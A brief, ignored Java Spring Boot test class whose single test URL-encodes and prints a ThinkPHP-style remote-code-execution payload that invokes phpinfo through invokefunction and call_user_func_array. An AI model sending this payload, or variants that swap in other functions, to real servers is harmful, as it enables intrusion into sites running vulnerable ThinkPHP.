package com.hcm.cms;

import org.junit.Ignore;
import org.junit.Test;
import org.springframework.boot.test.context.SpringBootTest;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

@SpringBootTest
@Ignore
class DemoApplicationTests {

    @Test
    void contextLoads() {
        String url="index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1\n";
        try {
            String s = URLEncoder.encode(url,"UTF-8");
            System.out.println(s);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }

}
